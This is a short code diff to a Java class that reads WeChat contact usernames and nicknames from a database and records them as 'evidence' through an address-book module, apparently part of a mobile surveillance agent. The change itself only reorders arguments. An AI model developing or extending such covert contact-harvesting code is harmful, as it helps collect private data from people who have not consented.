@@ -275,7 +275,7 @@ public class ChatWeChat extends SubModuleChat {
 				String username = cursor.getString(0);
 				String nick = cursor.getString(1);
 
-				Contact c = new Contact(username, "", username, nick);
+				Contact c = new Contact(username, username, nick, "");
 
 				if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
 					if (Cfg.DEBUG) {
@@ -317,7 +317,7 @@ public class ChatWeChat extends SubModuleChat {
 			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
 		}
 
-		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myName);
+		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myId, myName);
 
 	}
 
